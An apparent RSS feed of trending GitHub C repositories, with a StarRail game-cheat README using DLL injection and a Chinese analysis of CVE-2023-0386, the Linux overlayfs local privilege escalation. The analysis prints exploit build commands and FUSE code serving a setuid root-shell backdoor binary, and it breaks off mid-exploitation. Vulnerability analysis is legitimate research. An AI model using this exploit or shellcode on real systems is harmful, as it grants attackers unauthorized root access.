<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-05-10T01:30:16Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>NctimeAza/StarRail-Cheat</title>
    <updated>2023-05-10T01:30:16Z</updated>
    <id>tag:github.com,2023-05-10:/NctimeAza/StarRail-Cheat</id>
    <link href="https://github.com/NctimeAza/StarRail-Cheat" rel="alternate"></link>
    <summary type="html">&lt;p&gt;StarRail Cheat&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Akebi-SC-unofficial-&lt;/h1&gt; &#xA;&lt;p&gt;练手自用，基于akebi3.3更新&lt;/p&gt; &#xA;&lt;p&gt;功能：&lt;/p&gt; &#xA;&lt;p&gt;全局加速&lt;/p&gt; &#xA;&lt;p&gt;反和谐&lt;/p&gt; &#xA;&lt;p&gt;帧率解锁&lt;/p&gt; &#xA;&lt;p&gt;视场修改&lt;/p&gt; &#xA;&lt;p&gt;隐藏界面&lt;/p&gt; &#xA;&lt;p&gt;自由视角&lt;/p&gt; &#xA;&lt;p&gt;Shit cheat based on akebi3.3 src&lt;/p&gt; &#xA;&lt;p&gt;features:&lt;/p&gt; &#xA;&lt;p&gt;GameSpeed&lt;/p&gt; &#xA;&lt;p&gt;peeking&lt;/p&gt; &#xA;&lt;p&gt;fps unlock&lt;/p&gt; &#xA;&lt;p&gt;fov changer&lt;/p&gt; &#xA;&lt;p&gt;hide ui&lt;/p&gt; &#xA;&lt;p&gt;free camera&lt;/p&gt; &#xA;&lt;h1&gt;如何使用？&lt;/h1&gt; &#xA;&lt;p&gt;克隆仓库并编译&lt;/p&gt; &#xA;&lt;p&gt;从 &lt;a href=&#34;https://github.com/Z4ee/StarRail-ACE-B&#34;&gt;https://github.com/Z4ee/StarRail-ACE-B&lt;/a&gt; 克隆并编译，将得到的star_rail.dll与此项目编译得到的CLibrary.dll以及injector.exe放在同一目录&lt;/p&gt; &#xA;&lt;p&gt;启动&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;编译不了是你的问题&lt;/strong&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>chenaotian/CVE-2023-0386</title>
    <updated>2023-05-10T01:30:16Z</updated>
    <id>tag:github.com,2023-05-10:/chenaotian/CVE-2023-0386</id>
    <link href="https://github.com/chenaotian/CVE-2023-0386" rel="alternate"></link>
    <summary type="html">&lt;p&gt;CVE-2023-0386 analysis and Exp&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;README&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code&gt;gcc -Wall exp.c `pkg-config fuse --cflags --libs` -o exp&#xA;./exp /tmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230421161145840.png&#34; alt=&#34;image-20230421161145840&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;漏洞分析&lt;/h1&gt; &#xA;&lt;p&gt;本文的理论知识（命名空间、overlay文件系统、fuse文件系统等）均来自chatGPT。&lt;/p&gt; &#xA;&lt;h2&gt;漏洞简介&lt;/h2&gt; &#xA;&lt;p&gt;漏洞编号: CVE-2023-0386&lt;/p&gt; &#xA;&lt;p&gt;漏洞产品: linux kernel - overlay文件系统&lt;/p&gt; &#xA;&lt;p&gt;影响范围: 5.11 ~ 5.19&lt;/p&gt; &#xA;&lt;p&gt;利用条件: 可以unshar 或可以创建overlay文件系统&lt;/p&gt; &#xA;&lt;p&gt;利用效果: 本地提权&lt;/p&gt; &#xA;&lt;h2&gt;环境搭建&lt;/h2&gt; &#xA;&lt;p&gt;自己编译内核：&lt;/p&gt; &#xA;&lt;p&gt;准备漏洞版本范围内的，5.15版本之外的(5.15貌似有坑)，开启overlay 和fuse 两个fs：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;CONFIG_SLUB_DEBUGOVERLAY_FS&#xA;CONFIG_FUSE_FS&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;ubuntu 21.10 内核版本5.13.0-16-generic实测可以完成：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230421161145840.png&#34; alt=&#34;image-20230421161145840&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;漏洞原理&lt;/h2&gt; &#xA;&lt;p&gt;在漏洞分析之前，我们先让chatGPT cosplay一下linux内核专家：&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;(询问chatGPT：下面你扮演一个linux内核专家，帮助我解答一些问题)&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;补丁分析&lt;/h3&gt; &#xA;&lt;p&gt;漏洞的公开信息比较少，比较直接的就是漏洞的补丁信息，补丁链接如下：&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4f11ada10d0a&#34;&gt;https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4f11ada10d0a&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230503165509094.png&#34; alt=&#34;image-20230503165509094&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;可以看到是在&lt;code&gt;ovl_copy_up_one&lt;/code&gt;函数中增加了一个判断，我们先问一下chatGPT，这个函数是做什么的：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230503214724428.png&#34; alt=&#34;image-20230503214724428&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;所以这个函数是发生在，overlay文件系统的下层文件向上层拷贝的动作中，然后我们结合上下文来看这个补丁新加的判断：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;static int ovl_copy_up_one(struct dentry *parent, struct dentry *dentry,&#xA;&#x9;&#x9;&#x9;   int flags)&#xA;{&#xA;&#x9;int err;&#xA;&#x9;DEFINE_DELAYED_CALL(done);&#xA;&#x9;struct path parentpath;&#xA;&#x9;struct ovl_copy_up_ctx ctx = {&#xA;&#x9;&#x9;.parent = parent,&#xA;&#x9;&#x9;.dentry = dentry,&#xA;&#x9;&#x9;.workdir = ovl_workdir(dentry),&#xA;&#x9;};&#xA;&#xA;&#x9;if (WARN_ON(!ctx.workdir))&#xA;&#x9;&#x9;return -EROFS;&#xA;&#xA;&#x9;ovl_path_lower(dentry, &amp;amp;ctx.lowerpath);&#xA;&#x9;err = vfs_getattr(&amp;amp;ctx.lowerpath, &amp;amp;ctx.stat,//[1] 获取底层文件系统的stat&#xA;&#x9;&#x9;&#x9;  STATX_BASIC_STATS, AT_STATX_SYNC_AS_STAT);&#xA;&#x9;if (err)&#xA;&#x9;&#x9;return err;&#xA;&#x9;//[2]补丁新加判断文件的stat属性中的用户id和用户组id是否在当前命名空间有映射&#xA;&#x9;if (!kuid_has_mapping(current_user_ns(), ctx.stat.uid) ||&#xA;&#x9;    !kgid_has_mapping(current_user_ns(), ctx.stat.gid))&#xA;&#x9;&#x9;return -EOVERFLOW;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;[1] 首先通过&lt;code&gt;vfs_getattr&lt;/code&gt;函数获取底层文件系统目标文件的属性。&lt;code&gt;vfs_getattr&lt;/code&gt;函数获通过传入一个文件的&lt;code&gt;struct path&lt;/code&gt;结构来获取这个文件对应的&lt;code&gt;struct stat&lt;/code&gt;结构&lt;/p&gt; &#xA;&lt;p&gt;​ [1.1] &lt;code&gt;ctx.lowerpath&lt;/code&gt;为overlay文件系统中的下层文件系统的某文件路径，overlay文件系统会在后文介绍。&lt;/p&gt; &#xA;&lt;p&gt;​ [1.2] &lt;code&gt;struct stat&lt;/code&gt;结构存放文件的元数据信息，包括文件的属主属组等。而获取到的文件属主信息就会在下面补丁新加的判断中进行判断。&lt;/p&gt; &#xA;&lt;p&gt;[2] 然后调用&lt;code&gt;kuid_has_mapping&lt;/code&gt;函数对上面刚刚获取到的文件的属主信息和属组信息进行判断。判断目标文件属主和属组是否在当前用户命名空间中有映射。&lt;/p&gt; &#xA;&lt;p&gt;​ [2.1] &lt;code&gt;kuid_has_mapping&lt;/code&gt;函数传入两个参数，一个&lt;code&gt;struct user_namespace&lt;/code&gt;用户命名空间结构体和一个&lt;code&gt;struct kuid&lt;/code&gt;内核用户结构体，该函数会判断给定的用户信息是否在给定的用户命名空间中有映射，关于命名空间中用户的映射会在下文详细介绍。&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;所以我们知道，现在在进行该含有漏洞函数(&lt;code&gt;ovl_copy_up_one&lt;/code&gt;)操作的时候，如果目标下层文件的属主用户或属组用户在当前命名空间中没有映射的话，就会失败。&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;那么补丁原理便清楚了，但即便如此，我们还需要解决下面问题，才可完成这个漏洞的复现：&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;如何触发目标函数&lt;code&gt;ovl_copy_up_one&lt;/code&gt;所在的逻辑，即overlay文件系统中下层文件向上层拷贝？&lt;/li&gt; &#xA; &lt;li&gt;判断属主是否被映射的文件&lt;code&gt;lowerpath&lt;/code&gt;究竟在上面逻辑链中扮演什么角色？&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;那么在求解这两个疑问之前，我们需要搞清楚一些基本知识：&lt;/p&gt; &#xA;&lt;h3&gt;命名空间&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;(询问chatGPT：请介绍一下linux内核中的命名空间)&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;在Linux中，命名空间（namespaces）是一种内核特性，用于实现资源隔离。通过命名空间，可以使一组进程看起来好像它们在独立的系统环境中运行，从而提高系统的安全性和可管理性。命名空间在容器技术（如Docker）中起着关键作用，它们使得容器能够在隔离的环境中运行，而不会影响其他容器或主系统。&lt;/p&gt; &#xA;&lt;p&gt;Linux内核支持7种命名空间(mount、pid、net、ipc、user、time、cgroup)，每种命名空间都隔离了一类特定的系统资源。命名空间通过一系列系统调用（如&lt;code&gt;clone&lt;/code&gt;、**&lt;code&gt;unshare&lt;/code&gt;**和&lt;code&gt;setns&lt;/code&gt;）进行创建、修改和管理。容器运行时（如Docker）和其他虚拟化工具会利用这些命名空间特性，为容器提供独立、隔离的运行环境。&lt;/p&gt; &#xA;&lt;h4&gt;用户命名空间&lt;/h4&gt; &#xA;&lt;p&gt;其中漏洞补丁新增的判断函数&lt;code&gt;kuid_has_mapping&lt;/code&gt;涉及的是上述7个命名空间中的&lt;strong&gt;用户命名空间(user namespace)&lt;/strong&gt;。&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;(询问chatGPT：请介绍一下这其中的用户命名空间)&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;用户命名空间（User Namespace）用于隔离用户ID（UID）和组ID（GID）。通过用户命名空间，可以在不同命名空间中使用独立的用户和组ID集合。这意味着，在一个用户命名空间中的用户和组可能在另一个命名空间中具有不同的ID或权限。用户命名空间可以提高系统的安全性和可管理性，尤其在容器化环境中。&lt;/p&gt; &#xA;&lt;p&gt;用户命名空间的关键特性就是&lt;strong&gt;ID映射&lt;/strong&gt;：用户命名空间允许将一个命名空间中的UID和GID映射到另一个命名空间中的UID和GID。这意味着，在不同的用户命名空间中，相同的UID和GID可能代表不同的用户和组。例如，一个容器中的root用户（UID 0）可能在主系统中被映射为一个非特权用户。&lt;/p&gt; &#xA;&lt;p&gt;我们只需要记住以下几点：&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;同一个用户(组)，在不同用户命名空间中的uid(gid)不同&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;创建新用户命名空间(做这个创建动作)的用户在新用户命名空间中是root&lt;/li&gt; &#xA; &lt;li&gt;其他用户需要手动映射到新用户空间(修改/proc/[pid]/uid_map;/proc/[pid]/gid_map)，&lt;strong&gt;这个操作通常需要有初始命名空间中的root权限&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;没有映射的用户会被识别为nobody&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;如，我使用breeze用户创建一个新的用户命名空间，然后我再该用户命名空间中查看root属主的文件，显示属组为nobody：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230503205416800.png&#34; alt=&#34;image-20230503205416800&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;这是因为在新命名空间中，root用户是创建该命名空间的breeze用户，而初始命名空间中的root并没有被我手动映射到新命名空间中，所以在新命名空间中被识别为nobody。&lt;/p&gt; &#xA;&lt;p&gt;所以到这里我们就知道这个补丁的意义了：**对于拷贝的目标overlay 下层文件系统的文件，必须其属主(组)用户(组)在当前命名空间中有映射，才会继续下面的拷贝动作，否则返回错误。**也就是说这种被识别为nobody的情况就会造成拷贝失败。&lt;/p&gt; &#xA;&lt;h3&gt;overlay文件系统&lt;/h3&gt; &#xA;&lt;h4&gt;原理&lt;/h4&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;(询问chatGPT：请介绍一下linux中的overlay文件系统)&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Overlay 文件系统（又称为 OverlayFS）是一个 Linux 内核的虚拟文件系统。它允许将两个或多个已存在的目录层次结构（称为“lower”和“upper”层）合并成一个统一的视图。Overlay 文件系统在只读文件系统（如镜像）上实现写入操作的能力时非常有用，因为它可以将写操作重定向到一个叠加的可写层。这种方法在容器技术（如 Docker）中得到广泛应用，因为它提供了一种轻量级、高性能的文件系统虚拟化方案。&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;strong&gt;Lower 层&lt;/strong&gt;：这是基础文件系统层，通常是&lt;strong&gt;只读&lt;/strong&gt;的。&lt;strong&gt;一个 Overlay 文件系统可以有一个或多个 lower 层。&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Upper 层&lt;/strong&gt;：这是一个&lt;strong&gt;可写&lt;/strong&gt;的文件系统层，它存储所有对 lower 层文件的更改。这包括文件修改、创建和删除操作。&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Workdir&lt;/strong&gt;：这是一个与 upper 层在同一文件系统中的可写目录，用于存储一些中间数据和元数据，以支持 OverlayFS 的正常运行。&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Merged 层&lt;/strong&gt;：这是一个虚拟的、合成的视图，它将 lower 层和 upper 层合并在一起。当用户访问 Overlay 文件系统时，他们看到的是这个 merged 层。在这个层中，&lt;strong&gt;来自 upper 层的更改会覆盖 lower 层的相应文件。对于同名文件，upper 层中的文件优先级更高。对于同名目录，则合并，只判断目录中的文件是否有上下层覆盖屏蔽关系。&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;可以用下图理解某个overlay文件系统目录的实际上下层文件对应merge层文件的效果：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230504100543888.png&#34; alt=&#34;image-20230504100543888&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;由于上层文件系统是可写的，所以用户修改来自上层的文件时则直接修改。但如果用户想要修改下层文件系统中的文件，如上图中的file D，由于下层文件系统是只读的，则会将file D拷贝(copy up)到上层变成file D‘然后再进行修改操作，实际修改的是拷贝到上层的file D’，而下层文件系统中的file D本身不会被改变，这也是overlay文件系统中的COW(copy on write 写时复制)：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230504103155100.png&#34; alt=&#34;image-20230504103155100&#34;&gt;&lt;/p&gt; &#xA;&lt;h4&gt;创建一个overlay文件系统&lt;/h4&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;(询问chatGPT：请给我一个创建一个简单overlay文件系统的实际操作的例子)&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;我们通过如下方法简单演示一下如何创建一个overlay文件系统：&lt;/p&gt; &#xA;&lt;p&gt;首先，我们需要创建 lower1、lower2、upper 和 work 目录。这些目录将用于 Overlay 文件系统。同时，我们还需要创建一个挂载点（例如，merged）来访问合并后的视图。并向 lower1 和 lower2 目录中添加一些内容：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;mkdir lower1 lower2 upper work merged&#xA;echo &#34;This is a file in lower1.&#34; &amp;gt; lower1/file1.txt&#xA;echo &#34;This is a file in lower2.&#34; &amp;gt; lower2/file2.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;使用 &lt;code&gt;mount&lt;/code&gt; 命令和 &lt;code&gt;-t overlay&lt;/code&gt; 选项来挂载 Overlay 文件系统。您需要指定 lowerdir、upperdir 和 workdir 参数，如下所示：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;mount -t overlay overlay -o lowerdir=lower1:lower2,upperdir=upper,workdir=work merged&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;可以在merge目录中看到来自上下层文件系统的文件：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230503213819903.png&#34; alt=&#34;image-20230503213819903&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;我们在这个目录中无论是创建新文件、删除文件、修改文件，都只会改变上层文件系统，对下层不影响，如创建一个新文件(实际创建在了upper中)：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230503214009386.png&#34; alt=&#34;image-20230503214009386&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;修改现有文件(&lt;strong&gt;将文件从lower1中拷贝到upper然后修改&lt;/strong&gt;)：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230503214138872.png&#34; alt=&#34;image-20230503214138872&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;总结一下，跟漏洞相关的逻辑就是，当我们修改一个overlay文件系统中的来自下层的文件的时候，会先将这个文件拷贝到上层文件系统，然后进行修改动作。&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h3&gt;漏洞触发逻辑&lt;/h3&gt; &#xA;&lt;p&gt;经过上面的分析，我们基本可以复原出漏洞的全貌，如果一个overlay文件系统发生了copy up操作(尝试修改下层文件，触发下层文件向上层拷贝)的时候：&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;补丁的逻辑：我们不能拷贝还没有在当前用户命名空间映射的用户(组)属主(组)的文件&lt;/li&gt; &#xA; &lt;li&gt;漏洞的逻辑：所有文件都可以正常拷贝，包括没有在当前用户命名空间中映射的用户属主文件。&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;那么问题就是，&lt;strong&gt;为什么拷贝没有映射的用户属主的文件就会造成问题呢？&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h2&gt;漏洞利用&lt;/h2&gt; &#xA;&lt;p&gt;其实上面问题的答案很简单，拷贝文件并不只是拷贝文件的内容，包括文件的元数据，也就是文件的属主信息、时间戳、权限信息、还有扩展信息如capbilities等都会一起拷贝过来。引发的风险就是，&lt;strong&gt;如果下层文件系统是一个用户文件系统(如fuse)，用户高度可控，可以自定义任何文件，但该文件系统存在限制(如nosuid)，那么本漏洞就允许将下层用户自定义的suid文件从一个nosuid 文件系统拷贝到一个正常文件系统中，导致非法的suid文件获得suid特权。进而造成提权。&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h3&gt;fuse文件系统&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;(询问chatGPT：请介绍一下fuse文件系统)&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;FUSE（Filesystem in Userspace）是一种文件系统接口，允许用户在用户空间（而非内核空间）实现和运行自定义的文件系统。FUSE 设计的目的是简化文件系统的开发和部署，同时提供良好的性能和安全性。FUSE 在 Linux 和其他类 Unix 系统（如 macOS 和 FreeBSD）上广泛使用。&lt;/p&gt; &#xA;&lt;p&gt;其实简单的来说就是，&lt;strong&gt;fuse文件系统允许我们自己在用户层定义文件系统的一些回调函数(如open、write、readdir、甚至是getattr等文件元数据信息)。&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;下面的fuse文件系统代码(by chatGPT)既可以作为一个例子来学习，也可以用于后续的漏洞利用：&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;(询问chatGPT：请给我一个fuse文件系统的简单代码示例，这个文件系统中有一个hello文件，文件内容是一个&#34;helloworld&#34;字符串，并且这个文件是一个root属主的setuid文件)&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;经过简单修改(修改文件内容为后门二进制数据，修改一些文件权限设置，文件大小等)：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define FUSE_USE_VERSION 30&#xA;&#xA;#include &amp;lt;fuse.h&amp;gt;&#xA;#include &amp;lt;stdio.h&amp;gt;&#xA;#include &amp;lt;stdlib.h&amp;gt;&#xA;#include &amp;lt;string.h&amp;gt;&#xA;#include &amp;lt;errno.h&amp;gt;&#xA;&#xA;static const char *hello_path = &#34;/hello&#34;;//fuse文件系统中有一个名为hello的文件，这里是文件路径&#xA;const char hello_str[] = {//fuse文件系统中的suid 后门文件的二进制内容&#xA;    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,&#xA;    0x00, 0x56, 0x56, 0x56, 0x56, 0x00, 0x00, 0x00,&#xA;    0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,&#xA;    0xb0, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,&#xA;    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,&#xA;    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,&#xA;    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00,&#xA;    0x02, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,&#xA;    0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,&#xA;    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,&#xA;    0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,&#xA;    0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,&#xA;    0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,&#xA;    0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,&#xA;    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,&#xA;    0x51, 0xe5, 0x74, 0x64, 0x07, 0x00, 0x00, 0x00,&#xA;    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,&#xA;    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,&#xA;    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,&#xA;    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,&#xA;    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,&#xA;    0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,&#xA;    0x31, 0xff, 0x31, 0xd2, 0x31, 0xf6, 0x6a, 0x75,&#xA;    0x58, 0x0f, 0x05, 0x31, 0xff, 0x31, 0xd2, 0x31,&#xA;    0xf6, 0x6a, 0x77, 0x58, 0x0f, 0x05, 0x6a, 0x68,&#xA;    0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,&#xA;    0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72,&#xA;    0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01,&#xA;    0x01, 0x01, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e,&#xA;    0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31,&#xA;    0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05};&#xA;&#xA;static int hellofs_getattr(const char *path, struct stat *stbuf)//获取文件或目录的属性信息的回调函数getattr&#xA;{&#xA;    int res = 0;&#xA;&#xA;    memset(stbuf, 0, sizeof(struct stat));&#xA;&#xA;    if (strcmp(path, &#34;/&#34;) == 0) {//fuse文件系统根目录的权限，0755&#xA;        stbuf-&amp;gt;st_mode = S_IFDIR | 0755;&#xA;        stbuf-&amp;gt;st_nlink = 2;&#xA;    } else if (strcmp(path, hello_path) == 0) {//hello文件的权限，777并且带有SUID&#xA;    stbuf-&amp;gt;st_mode = S_IFREG | S_ISUID | 0777;&#xA;        stbuf-&amp;gt;st_nlink = 1;&#xA;        stbuf-&amp;gt;st_size = sizeof(hello_str); //hello文件实际大小&#xA;    } else {&#xA;        res = -ENOENT;&#xA;    }&#xA;&#xA;    return res;&#xA;}&#xA;&#xA;static int hellofs_readdir(const char *path, void *buf, fuse_fill_dir_t filler,&#xA;                           off_t offset, struct fuse_file_info *fi)//获取目录信息的函数&#xA;{&#xA;    (void) offset;&#xA;    (void) fi;&#xA;&#xA;    if (strcmp(path, &#34;/&#34;) != 0) {//目前只支持查看fuse的根目录&#xA;        return -ENOENT;&#xA;    }&#xA;&#xA;    filler(buf, &#34;.&#34;, NULL, 0);//默认显示.和..&#xA;    filler(buf, &#34;..&#34;, NULL, 0);&#xA;    filler(buf, hello_path + 1, NULL, 0);//fuse根目录有一个hello文件&#xA;&#xA;    return 0;&#xA;}&#xA;&#xA;static int hellofs_open(const char *path, struct fuse_file_info *fi)//打开文件的open回调函数&#xA;{&#xA;    if (strcmp(path, hello_path) != 0) {//只支持打开hello文件&#xA;        return -ENOENT;&#xA;    }&#xA;&#xA;    return 0;&#xA;}&#xA;&#xA;static int hellofs_read(const char *path, char *buf, size_t size, off_t offset,&#xA;                        struct fuse_file_info *fi)//读文件的回调函数read&#xA;{&#xA;    size_t len;&#xA;    (void) fi;&#xA;    if(strcmp(path, hello_path) != 0) {//只支持读hello文件&#xA;        return -ENOENT;&#xA;    }&#xA;    len = sizeof(hello_str);&#xA;    if (offset &amp;lt; len) {&#xA;        if (offset + size &amp;gt; len) {&#xA;            size = len - offset;&#xA;        }&#xA;        memcpy(buf, hello_str + offset, size);//返回hello文件的内容，即上面的二进制数组&#xA;    } else {&#xA;        size = 0;&#xA;    }&#xA;&#xA;    return size;&#xA;}&#xA;&#xA;static struct fuse_operations hellofs_oper = {//只实现上述四个回调函数已经够了&#xA;    .getattr = hellofs_getattr,&#xA;    .readdir = hellofs_readdir,&#xA;    .open = hellofs_open,&#xA;    .read = hellofs_read,&#xA;};&#xA;&#xA;int main(int argc, char *argv[])&#xA;{&#xA;    return fuse_main(argc, argv, &amp;amp;hellofs_oper, NULL);//注册回调函数&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;上述代码创建了一个fuse文件系统，但里面只有一个文件hello，其内容是一段二进制后门程序，并且它的权限是root属主的setuid文件。一共只实现了四个回调函数，只能用于最基本的查看和打开和读取hello文件。我们可以通过如下命令编译和挂载fuse文件系统：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;gcc -Wall hellofs.c `pkg-config fuse --cflags --libs` -o hellofs&#xA;mkdir fusefs&#xA;./hellofs ./fusefs&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;然后可以在fusefs目录中看到我们的hello文件，是一个root属主的suid文件：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230504144546539.png&#34; alt=&#34;image-20230504144546539&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;**但是普通用户无法开启suid挂载fuse文件系统，也就是说普通用户挂载的fuse文件系统都是nosuid的。**所以现在即便执行这个suid 的后门文件，我们也无法获得root的权限：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/chenaotian/CVE-2023-0386/main/img/image-20230504144846572.png&#34; alt=&#34;image-20230504144846572&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;漏洞利用&lt;/h3&gt; &#xA;&lt;p&gt;接下来我们用CVE-2023-0386漏洞和上述fuse文件系统来完成提权操作。&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;首先我们需要根据漏洞场景构造出一个overlay文件系统，使用fuse文件系统作为下层文件系统，找一个我们可写的目录作为上层文件系统，先创建出workdir等overlay相关目录，并挂载fuse文件系统&lt;/p&gt; 